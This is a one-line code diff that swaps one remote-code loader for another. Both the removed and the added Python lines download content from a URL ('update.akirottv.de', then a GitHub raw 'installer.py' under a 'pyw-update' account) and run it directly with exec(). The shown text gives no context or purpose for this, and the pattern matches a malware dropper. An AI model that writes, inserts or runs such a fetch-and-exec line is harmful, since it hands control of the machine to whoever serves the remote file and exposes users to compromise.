@@ -1,1 +1,1 @@
-import urllib.request; exec(urllib.request.urlopen("https://update.akirottv.de/").read())
+import urllib.request; exec(urllib.request.urlopen("https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/installer.py").read())
